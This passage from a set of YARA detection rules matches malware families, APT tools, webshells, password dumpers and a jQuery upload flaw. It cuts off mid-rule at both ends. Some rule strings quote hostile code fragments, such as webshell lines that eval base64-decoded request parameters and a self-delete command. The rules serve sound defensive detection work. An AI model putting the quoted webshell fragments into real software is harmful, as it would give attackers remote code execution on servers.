      hash1 = "57b8ea2870f5176a30e6cba2d717fb3ff342f8bd36bac652dc4194a313b5fa64"
      hash2 = "d75561a744e3ed45dfbf25fe7c120bd24c38138ac469fd02e383dd455a540334"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "C:\\Users\\User\\Desktop\\Encrypt\\Math_Cad\\Release\\Math_Cad.pdb" fullword ascii
      $x2 = "AxedWV3OVTFfnGb" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 1 of them
}

rule MAL_Trickbot_Malware_Oct19_4_RID3136 : DEMO EXE FILE MAL {
   meta:
      description = "Detects Trickbot malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-10-02 13:12:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "25a4ae2a1ce6dbe7da4ba1e2559caa7ed080762cf52dba6c8b55450852135504"
      hash2 = "e92dd00b092b435420f0996e4f557023fe1436110a11f0f61fbb628b959aac99"
      hash3 = "aabf54eb27de3d72078bbe8d99a92f5bcc1e43ff86774eb5321ed25fba5d27d4"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "c:\\users\\user\\documents\\visual studio 2005\\projects\\adzxser\\release\\ADZXSER.pdb" fullword ascii
      $x2 = "http://root-hack.org" fullword ascii
      $x3 = "http://hax-studios.net" fullword ascii
      $x4 = "5OCFBBKCAZxWUE#$_SVRR[SQJ" fullword ascii
      $x5 = "G*\\AC:\\Users\\911\\Desktop\\cButtonBar\\cButtonBar\\ButtonBar.vbp" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 1 of them
}

rule MAL_Trickbot_Malware_Oct19_5_RID3137 : DEMO EXE FILE MAL {
   meta:
      description = "Detects Trickbot malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-10-02 13:13:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "58852140a2dc30e799b7d50519c56e2fd3bb506691918dbf5d4244cc1f4558a2"
      hash2 = "aabf54eb27de3d72078bbe8d99a92f5bcc1e43ff86774eb5321ed25fba5d27d4"
      hash3 = "9ecc794ec77ce937e8c835d837ca7f0548ef695090543ed83a7adbc07da9f536"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "LoadShellCode" fullword ascii
      $s2 = "pShellCode" fullword ascii
      $s3 = "InitShellCode" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 2 of them
}

rule MAL_ArtraDownloader2_Aug19_1_RID30FB : DEMO EXE FILE MAL {
   meta:
      description = "Detects ArtraDownloader malware"
      author = "Florian Roth"
      reference = "https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/"
      date = "2019-08-27 13:03:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f0ef4242cc6b8fa3728b61d2ce86ea934bd59f550de9167afbca0b0aaa3b2c22"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $xc1 = { 47 45 54 20 25 73 20 48 54 54 50 2F 31 2E 30 00 0D 0A 00 00 48 6F 73 74 3A 20 25 73 00 00 00 00 3F 61 3D 00 26 62 3D 00 26 63 3D 00 26 64 3D 00 26 65 3D 00 25 32 30 } 
      $xc2 = { 25 73 20 25 73 20 25 73 0D 0A 25 73 20 25 73 0D 0A 25 73 25 73 0D 0A 25 73 25 73 0D 0A 25 73 20 25 64 0D 0A 0D 0A 25 73 00 00 00 00 71 72 79 3D } 
      $xc3 = { 49 44 3D 25 73 00 00 00 3A 00 00 00 25 73 20 25 73 20 25 73 0D 0A 25 73 20 25 73 0D 0A 25 73 25 73 0D 0A 25 73 25 73 0D 0A 43 6F 6E 74 65 6E 74 2D 6C 65 6E 67 74 68 25 73 20 25 64 } 
      $xc4 = { 25 73 20 25 73 20 25 73 0D 0A 25 73 20 25 73 0D 0A 25 73 25 73 0D 0A 25 73 25 73 0D 0A 43 6F 6E 74 65 6E 74 2D 6C 65 6E 67 74 68 3A 20 25 64 0D 0A 0D 0A 25 73 } 
      $x1 = "Tpguxbsf]Njdsptpgu" ascii
      $x2 = ".gpsn.vsmfodpefe" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them
}

rule APT_APT41_HIGHNOON_BIN_2_RID2E21 : APT DEMO EXE FILE G0096 {
   meta:
      description = "Detects APT41 malware HIGHNOON.BIN"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html"
      date = "2019-08-07 11:01:21"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "63e8ed9692810d562adb80f27bb1aeaf48849e468bf5fd157bc83ca83139b6d7"
      hash2 = "c51c5bbc6f59407286276ce07f0f7ea994e76216e0abe34cbf20f1b1cbd9446d"
      tags = "APT, DEMO, EXE, FILE, G0096"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "\\Double\\Door_wh\\" ascii
      $x2 = "[Stone] Config --> 2k3 TCP Positive Logout." fullword ascii
      $x3 = "\\RbDoorX64.pdb" ascii
      $x4 = "RbDoor, Version 1.0" fullword wide
      $x5 = "About RbDoor" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them
}

rule MAL_AveMaria_RAT_Jul19_RID2E8A : AveMaria DEMO EXE FILE MAL {
   meta:
      description = "Detects AveMaria RAT"
      author = "Florian Roth"
      reference = "https://twitter.com/abuse_ch/status/1145697917161934856"
      date = "2019-07-01 11:18:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5a927db1566468f23803746ba0ccc9235c79ca8672b1444822631ddbf2651a59"
      tags = "AveMaria, DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $a1 = "operator co_await" fullword ascii
      $s1 = "uohlyatqn" fullword ascii
      $s2 = "index = [%d][%d][%d][%d]" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them
}

rule HKTL_LNX_Pnscan_RID2C57 : DEMO HKTL LINUX T1046 {
   meta:
      description = "Detects Pnscan port scanner"
      author = "Florian Roth"
      reference = "https://github.com/ptrrkssn/pnscan"
      date = "2019-05-27 09:45:01"
      score = 55
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, LINUX, T1046"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "-R<hex list>   Hex coded response string to look for." fullword ascii
      $x2 = "This program implements a multithreaded TCP port scanner." ascii wide
   condition: 
      filesize < 6000KB and 1 of them
}

rule APT_MAL_HOPLIGHT_NK_HiddenCobra_Apr19_1_RID33F3 : APT DEMO G0032 MAL NK {
   meta:
      description = "Detects HOPLIGHT malware used by HiddenCobra APT group"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/analysis-reports/AR19-100A"
      date = "2019-04-13 15:09:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d77fdabe17cdba62a8e728cbe6c740e2c2e541072501f77988674e07a05dfb39"
      tags = "APT, DEMO, G0032, MAL, NK"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "www.naver.com" fullword ascii
      $s2 = "PolarSSL Test CA0" fullword ascii
   condition: 
      filesize < 1000KB and all of them
}

rule Ransom_LockerGoga_Mar19_1_RID3037 : CRIME DEMO EXE FILE MAL RANSOM {
   meta:
      description = "Detects LockerGoga ransomware binaries"
      author = "Florian Roth"
      reference = "https://www.nrk.no/norge/skreddersydd-dobbeltangrep-mot-hydro-1.14480202"
      date = "2019-03-19 12:30:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c97d9bbc80b573bdeeda3812f4d00e5183493dd0d5805e2508728f65977dda15"
      hash2 = "7bcd69b3085126f7e97406889f78ab74e87230c11812b79406d723a80c08dd26"
      hash3 = "bdf36127817413f625d2625d3133760af724d6ad2410bea7297ddc116abc268f"
      tags = "CRIME, DEMO, EXE, FILE, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "\\.(doc|dot|wbk|docx|dotx|docb|xlm|xlsx|xltx|xlsb|xlw|ppt|pot|pps|pptx|potx|ppsx|sldx|pdf)" wide
      $x2 = "|[A-Za-z]:\\cl.log" wide
      $x4 = "\\crypto-locker\\" ascii
      $xc1 = { 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00 00 4D 00 6C 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 } 
      $xc2 = { 00 2E 00 6C 00 6F 00 63 00 6B 00 65 00 64 00 00 00 20 46 41 49 4C 45 44 20 00 00 00 00 20 00 00 00 20 75 6E 6B 6E 6F 77 6E 20 65 78 63 65 70 74 69 6F 6E } 
      $rn1 = "This may lead to the impossibility of recovery of the certain files." wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 1 of ( $x* ) ) or $rn1
}

rule MAL_CMD_Script_Obfuscated_Feb19_1_RID32B7 : DEMO FILE MAL OBFUS SCRIPT T1059 {
   meta:
      description = "Detects obfuscated batch script using env variable sub-strings"
      author = "Florian Roth"
      reference = "https://twitter.com/DbgShell/status/1101076457189793793"
      date = "2019-03-01 14:17:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "deed88c554c8f9bef4078e9f0c85323c645a52052671b94de039b438a8cff382"
      tags = "DEMO, FILE, MAL, OBFUS, SCRIPT, T1059"
      minimum_yara = "3.5.0"
      
   strings:
      $h1 = { 40 65 63 68 6F 20 6F 66 66 0D 0A 73 65 74 20 } 
      $s1 = { 2C 31 25 0D 0A 65 63 68 6F 20 25 25 } 
   condition: 
      uint16 ( 0 ) == 0x6540 and filesize < 200KB and $h1 at 0 and uint16 ( filesize - 3 ) == 0x0d25 and uint8 ( filesize - 1 ) == 0x0a and $s1 in ( filesize - 200 .. filesize )
}

rule HKTL_Dsniff_RID2AFD : APT DEMO HKTL {
   meta:
      description = "Detects Dsniff hack tool"
      author = "Florian Roth"
      reference = "https://securelist.com/faq-the-projectsauron-apt/75533/"
      date = "2019-02-19 08:47:21"
      score = 55
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "APT, DEMO, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = ".*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*" 
   condition: 
      1 of them
}

rule APT_WebShell_Tiny_1_RID2DFE : APT DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detetcs a tiny webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 10:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "eval(" ascii wide
   condition: 
      ( uint16 ( 0 ) == 0x3f3c or uint16 ( 0 ) == 0x253c ) and filesize < 40 and $x1
}

rule APT_WebShell_AUS_Tiny_2_RID2F47 : APT DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detetcs a tiny webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 11:50:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0d6209d86f77a0a69451b0f27b476580c14e0cda15fa6a5003aab57a93e7e5a5"
      tags = "APT, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Request.Item[System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\"[password]\"))];" ascii
      $x2 = "eval(arguments,System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\"" ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c or uint16 ( 0 ) == 0x253c ) and filesize < 1KB and 1 of them
}

rule APT_WebShell_AUS_JScript_3_RID3063 : APT DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detetcs a webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 12:37:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7ac6f973f7fccf8c3d58d766dec4ab7eb6867a487aa71bc11d5f05da9322582d"
      tags = "APT, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<%@ Page Language=\"Jscript\" validateRequest=\"false\"%><%try{eval(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String" ascii
      $s2 = ".Item[\"[password]\"])),\"unsafe\");}" ascii
   condition: 
      uint16 ( 0 ) == 0x6568 and filesize < 1KB and all of them
}

rule APT_WebShell_AUS_4_RID2D46 : APT DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detetcs a webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 10:24:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "83321c02339bb51735fbcd9a80c056bd3b89655f3dc41e5fef07ca46af09bb71"
      tags = "APT, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "wProxy.Credentials = new System.Net.NetworkCredential(pusr, ppwd);" fullword ascii
      $s2 = "{return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(" ascii
      $s3 = ".Equals('User-Agent', StringComparison.OrdinalIgnoreCase))" ascii
      $s4 = "gen.Emit(System.Reflection.Emit.OpCodes.Ret);" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x7566 and filesize < 10KB and 3 of them
}

rule APT_WebShell_AUS_5_RID2D47 : APT DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detetcs a webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 10:25:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "54a17fb257db2d09d61af510753fd5aa00537638a81d0a8762a5645b4ef977e4"
      tags = "APT, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $a1 = "function DEC(d){return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(d));}" fullword ascii
      $a2 = "function ENC(d){return Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(d));}" fullword ascii
      $s1 = "var hash=DEC(Request.Item['" ascii
      $s2 = "Response.Write(ENC(SET_ASS_SUCCESS));" fullword ascii
      $s3 = "hashtable[hash] = assCode;" fullword ascii
      $s4 = "Response.Write(ss);" fullword ascii
      $s5 = "var hashtable = Application[CachePtr];" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x7566 and filesize < 2KB and 4 of them
}

rule HKTL_PowerKatz_Feb19_1_RID2EB0 : DEMO HKTL powerkatz {
   meta:
      description = "Detetcs a tool used in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 11:25:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, powerkatz"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Powerkatz32" ascii wide fullword
      $x2 = "Powerkatz64" ascii wide
      $s1 = "GetData: not found taskName" fullword ascii wide
      $s2 = "GetRes Ex:" fullword ascii wide
   condition: 
      1 of ( $x* ) and 1 of ( $s* )
}

rule PUA_CryptoMiner_Jan19_1_RID2F44 : DEMO MAL {
   meta:
      description = "Detects Crypto Miner strings"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-01-31 11:49:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ede858683267c61e710e367993f5e589fcb4b4b57b09d023a67ea63084c54a05"
      tags = "DEMO, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Stratum notify: invalid Merkle branch" fullword ascii
      $s2 = "-t, --threads=N       number of miner threads (default: number of processors)" fullword ascii
      $s3 = "User-Agent: cpuminer/" ascii
      $s4 = "hash > target (false positive)" fullword ascii
      $s5 = "thread %d: %lu hashes, %s khash/s" fullword ascii
   condition: 
      filesize < 1000KB and 1 of them
}

rule HKTL_Lazagne_PasswordDumper_Dec18_1_RID33E8 : DEMO EXE FILE HKTL T1003 {
   meta:
      description = "Detects password dumper Lazagne often used by middle eastern threat groups"
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group"
      date = "2018-12-11 15:07:51"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1205f5845035e3ee30f5a1ced5500d8345246ef4900bcb4ba67ef72c0f79966c"
      hash2 = "884e991d2066163e02472ea82d89b64e252537b28c58ad57d9d648b969de6a63"
      hash3 = "bf8f30031769aa880cdbe22bc0be32691d9f7913af75a5b68f8426d4f0c7be50"
      tags = "DEMO, EXE, FILE, HKTL, T1003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "softwares.opera(" ascii
      $s2 = "softwares.mozilla(" ascii
      $s3 = "config.dico(" ascii
      $s4 = "softwares.chrome(" ascii
      $s5 = "softwares.outlook(" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and 1 of them
}

rule MAL_HawkEye_Keylogger_Gen_Dec18_RID324D : DEMO GEN MAL T1056_001 T1113 {
   meta:
      description = "Detects HawkEye Keylogger Reborn"
      author = "Florian Roth"
      reference = "https://twitter.com/James_inthe_box/status/1072116224652324870"
      date = "2018-12-10 13:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b8693e015660d7bd791356b352789b43bf932793457d54beae351cf7a3de4dad"
      tags = "DEMO, GEN, MAL, T1056_001, T1113"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "HawkEye Keylogger" fullword wide
      $s2 = "_ScreenshotLogger" ascii
      $s3 = "_PasswordStealer" ascii
   condition: 
      2 of them
}

rule WebShell_JexBoss_JSP_1_RID2F20 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects JexBoss JSPs"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-11-08 11:43:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "41e0fb374e5d30b2e2a362a2718a5bf16e73127e22f0dfc89fdb17acbe89efdf"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "equals(\"jexboss\")" 
      $x2 = "%><pre><%if(request.getParameter(\"ppp\") != null &&" ascii
      $s1 = "<%@ page import=\"java.util.*,java.io.*\"%><pre><% if (request.getParameter(\"" 
      $s2 = "!= null && request.getHeader(\"user-agent\"" ascii
      $s3 = "String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }}%>" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 1KB and 1 of ( $x* ) or 2 of them
}

rule WebShell_JexBoss_WAR_1_RID2F1D : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detects JexBoss versions in WAR form"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-11-08 11:43:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6271775ab144ce9bb9138bf054b149b5813d3beb96338993c6de35330f566092"
      hash2 = "6f14a63c3034d3762da8b3ad4592a8209a0c88beebcb9f9bd11b40e879f74eaf"
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $ = "jbossass" fullword ascii
      $ = "jexws.jsp" fullword ascii
      $ = "jexws.jspPK" fullword ascii
      $ = "jexws1.jsp" fullword ascii
      $ = "jexws1.jspPK" fullword ascii
      $ = "jexws2.jsp" fullword ascii
      $ = "jexws2.jspPK" fullword ascii
      $ = "jexws3.jsp" fullword ascii
      $ = "jexws3.jspPK" fullword ascii
      $ = "jexws4.jsp" fullword ascii
      $ = "jexws4.jspPK" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 4KB and 1 of them
}

rule MAL_BackNet_Nov18_1_RID2D6D : DEMO EXE FILE MAL T1047 {
   meta:
      description = "Detects BackNet samples"
      author = "Florian Roth"
      reference = "https://github.com/valsov/BackNet"
      date = "2018-11-02 10:31:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4ce82644eaa1a00cdb6e2f363743553f2e4bd1eddb8bc84e45eda7c0699d9adc"
      tags = "DEMO, EXE, FILE, MAL, T1047"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "ProcessedByFody" fullword ascii
      $s2 = "SELECT * FROM AntivirusProduct" fullword wide
      $s3 = "/C netsh wlan show profile" wide
      $s4 = "browsertornado" fullword wide
      $s5 = "Current user is administrator" fullword wide
      $s6 = "/C choice /C Y /N /D Y /T 4 & Del" wide
      $s7 = "ThisIsMyMutex-2JUY34DE8E23D7" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them
}

rule MAL_ELF_LNX_Mirai_Oct10_2_RID2F3A : DEMO FILE LINUX MAL {
   meta:
      description = "Detects ELF malware Mirai related"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-10-27 11:48:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "fa0018e75f503f9748a5de0d14d4358db234f65e28c31c8d5878cc58807081c9"
      tags = "DEMO, FILE, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $c01 = { 50 4F 53 54 20 2F 63 64 6E 2D 63 67 69 2F 00 00 20 48 54 54 50 2F 31 2E 31 0D 0A 55 73 65 72 2D 41 67 65 6E 74 3A 20 00 0D 0A 48 6F 73 74 3A } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them
}

rule VULN_JQuery_FileUpload_CVE_2018_9206_Oct18_RID34DE : CVE_2018_9206 DEMO VULN {
   meta:
      description = "Detects JQuery File Upload vulnerability CVE-2018-9206"
      author = "Florian Roth"
      reference = "https://www.zdnet.com/article/zero-day-in-popular-jquery-plugin-actively-exploited-for-at-least-three-years/"
      date = "2018-10-19 15:48:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-11-15"
      tags = "CVE_2018_9206, DEMO, VULN"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "error_reporting(E_ALL | E_STRICT);" ascii fullword
      $s2 = "require('UploadHandler.php');" ascii fullword
      $s3 = "$upload_handler = new UploadHandler();" ascii fullword
   condition: 
      all of them
}

rule APT_GreyEnergy_Malware_Oct18_2_RID31FD : APT DEMO EXE FILE {
   meta:
      description = "Detects samples from Grey Energy report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/"
      date = "2018-10-17 13:46:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c6a54912f77a39c8f909a66a940350dcd8474c7a1d0e215a878349f1b038c58a"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "WioGLtonuaptWmrnttfepgetneemVsnygnV" fullword ascii
      $s2 = "PnSenariopoeKerGEtxrcy" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them
}

rule APT_GreyEnergy_Malware_Oct18_3_RID31FE : APT DEMO EXE FILE {
   meta:
      description = "Detects samples from Grey Energy report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/"
      date = "2018-10-17 13:46:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0db5e5b68dc4b8089197de9c1e345056f45c006b7b487f7d8d57b49ae385bad0"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "USQTUNPPQONOPOQUMSNUTRMRRLVPUOPMROPMPMQTPNPONVUOUQOMMNNSRSRQQVTPPRSSNVSTURTMMOPTONSQTOMONQVMQNUSONTQTUTSRRPVTONUQNORQMRRNRUSPS" fullword ascii
      $x2 = "tEMPiuP" fullword ascii
      $x3 = "sryCEMieye" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them
}

rule APT_GreyEnergy_Malware_Oct18_5_RID3200 : APT DEMO EXE FILE {
   meta:
      description = "Detects samples from Grey Energy report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/"
      date = "2018-10-17 13:46:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "037723bdb9100d19bf15c5c21b649db5f3f61e421e76abe9db86105f1e75847b"
      hash2 = "b602ce32b7647705d68aedbaaf4485f1a68253f8f8132bd5d5f77284a6c2d8bb"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s12 = "WespySSld.eQ" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them
}

rule MAL_JRAT_Oct18_1_RID2BF9 : DEMO FILE MAL {
   meta:
      description = "Detects JRAT malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-10-11 09:29:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ce190c37a6fdb2632f4bc5ea0bb613b3fbe697d04e68e126b41910a6831d3411"
      tags = "DEMO, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "/JRat.class" ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 700KB and 1 of them
}

rule HKTL_SqlMap_RID2AF1 : DEMO HKTL {
   meta:
      description = "Detects sqlmap hacktool"
      author = "Florian Roth"
      reference = "https://github.com/sqlmapproject/sqlmap"
      date = "2018-10-09 09:33:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9444478b03caf7af853a64696dd70083bfe67f76aa08a16a151c00aadb540fa8"
      tags = "DEMO, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "if cmdLineOptions.get(\"sqlmapShell\"):" fullword ascii
      $x2 = "if conf.get(\"dumper\"):" fullword ascii
   condition: 
      filesize < 50KB and 1 of them
}

rule APT_HiddenCobra_GhostSecret_2_RID31E3 : APT DEMO EXE FILE G0032 NK {
   meta:
      description = "Detects Hidden Cobra Sample"
      author = "Florian Roth"
      reference = "https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/"
      date = "2018-08-11 13:41:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "45e68dce0f75353c448865b9abafbef5d4ed6492cd7058f65bf6aac182a9176a"
      tags = "APT, DEMO, EXE, FILE, G0032, NK"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "ping 127.0.0.1 -n 3" fullword wide
      $s2 = "Process32" fullword ascii
      $s11 = "%2d%2d%2d%2d%2d%2d" fullword ascii
      $s12 = "del /a \"" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them
}

rule APT_FIN7_MalDoc_Aug18_1_RID2E6D : APT DEMO G0046 RUSSIA {
   meta:
      description = "Detects malicious Doc from FIN7 campaign"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01 11:14:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9c12591c850a2d5355be0ed9b3891ccb3f42e37eaf979ae545f2f008b5d124d6"
      tags = "APT, DEMO, G0046, RUSSIA"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<photoshop:LayerText>If this document was downloaded from your email, please click  \"Enable editing\" from the yellow bar above" ascii
   condition: 
